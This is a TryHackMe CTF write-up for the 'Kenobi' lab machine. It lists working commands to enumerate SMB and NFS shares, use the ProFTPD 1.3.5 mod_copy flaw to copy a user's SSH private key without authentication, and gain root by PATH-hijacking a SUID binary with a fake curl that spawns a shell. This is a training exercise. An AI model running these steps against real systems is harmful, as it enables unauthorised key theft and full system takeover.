# Kenobi – TryHackMe Writeup

## Objective
Enumerate Samba shares, exploit a vulnerable ProFTPD service to gain initial access, and escalate privileges using PATH variable manipulation.

---

# Reconnaissance

## Check if host is alive
```bash
ping -c 5 <target-ip>
```

---

## Full Port Scan
```bash
nmap -sC -sV -p- -vvv <target-ip>
```

### Key Services Found
- 21 → FTP (ProFTPD)
- 139/445 → SMB (Samba)
- 111 → rpcbind (NFS)
- SSH

---

# SMB Enumeration

### List SMB shares
```bash
smbclient -L //<target-ip> -N
```

### Shares discovered
- anonymous
- others

---

### Access anonymous share
```bash
smbclient //<target-ip>/anonymous -N
ls
```

Found:
```
log.txt
```

---

### Download share contents
```bash
smbget -R smb://<target-ip>/anonymous
```

### Inspect log
```bash
cat log.txt
```

### Information gathered
- Kenobi SSH key location → `/home/kenobi/.ssh/id_rsa`
- FTP runs as user kenobi
- ProFTPD version info

---

# NFS Enumeration

Port 111 indicated NFS.

### Enumerate NFS exports
```bash
nmap -p 111 --script=nfs-ls,nfs-showmount,nfs-statfs <target-ip>
```

### Found mount
```
/var
```

---

# Initial Access – ProFTPD Exploit

## Check FTP version
```bash
nc <target-ip> 21
```

Version:
```
ProFTPD 1.3.5
```

---

## Search exploit
```bash
searchsploit proftpd 1.3.5
```

Found:
```
mod_copy module vulnerability
```

This allows copying files without authentication.

---

## Copy Kenobi's private key

Connect to FTP:
```bash
nc <target-ip> 21
```

Execute:
```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Private key copied to `/var/tmp`.

---

# Mount NFS Share

```bash
mkdir /mnt/kenobiNFS
mount <target-ip>:/var /mnt/kenobiNFS
```

Retrieve key:
```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

---

# SSH Access

```bash
ssh -i id_rsa kenobi@<target-ip>
```

Login successful.

---

## User Flag
```bash
cat /home/kenobi/user.txt
```

---

# Privilege Escalation – PATH Variable Manipulation

## Find SUID files
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Interesting binary
```
/usr/bin/menu
```

---

## Run the binary
```bash
/usr/bin/menu
```

Menu shows options that internally use:
```
curl
uname
ifconfig
```

These commands are called **without full paths**, making them vulnerable to PATH hijacking.

---

## Exploit PATH

Create fake curl:
```bash
echo /bin/sh > /tmp/curl
chmod +x /tmp/curl
```

Add /tmp to PATH:
```bash
export PATH=/tmp:$PATH
```

Run:
```bash
/usr/bin/menu
```

Since the program runs as root, it executes our fake curl → spawns root shell.

---

# Root Access

```bash
whoami
```

Output:
```
root
```

---

## Root Flag
```bash
cat /root/root.txt
```

---

# Attack Flow Summary

- Nmap scanning
- SMB share enumeration
- Extracted sensitive info from logs
- ProFTPD mod_copy file copy exploit
- Mounted NFS share
- SSH key login as kenobi
- SUID enumeration
- PATH hijacking
- Root access gained

---

# Tools Used

- Nmap
- smbclient
- smbget
- searchsploit
- Netcat
- NFS mount
- SSH
- Linux privilege escalation techniques

---

✅ Room completed successfully
